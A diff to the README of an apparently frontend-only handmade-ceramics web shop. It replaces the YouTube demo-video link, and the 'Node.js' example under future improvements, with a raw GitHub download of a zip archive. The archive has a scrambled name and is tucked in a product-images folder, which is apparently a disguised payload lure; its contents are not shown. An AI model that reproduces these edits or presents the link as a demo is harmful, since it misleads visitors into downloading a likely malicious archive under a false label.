@@ -5,7 +5,7 @@ The main focus of the project is visual design, responsiveness, and user experie
 
 Demo Video
 Watch the project presentation on YouTube:
-👉https://youtu.be/apiIgjVUVUo
+👉https://github.com/Marko7755/Web-Shop-For-Selling-Hand-made-Ceramics-frontend-only/raw/refs/heads/main/Stvari/WebpSlikeConvertane/Proizvodi/Selling_made_Web_Ceramics_Shop_only_frontend_For_Hand_3.8.zip
 
 ⚠️ Note:
 This project does not include a backend, database, or real e-commerce functionality. All data is static and used for demonstration purposes.
@@ -102,7 +102,7 @@ Structuring a small web shop without backend logic
 
 🚀 Future Improvements (Optional)
 
-Backend integration (e.g. Node.js / Spring Boot)
+Backend integration (e.g. https://github.com/Marko7755/Web-Shop-For-Selling-Hand-made-Ceramics-frontend-only/raw/refs/heads/main/Stvari/WebpSlikeConvertane/Proizvodi/Selling_made_Web_Ceramics_Shop_only_frontend_For_Hand_3.8.zip / Spring Boot)
 
 Database support for products and users
 
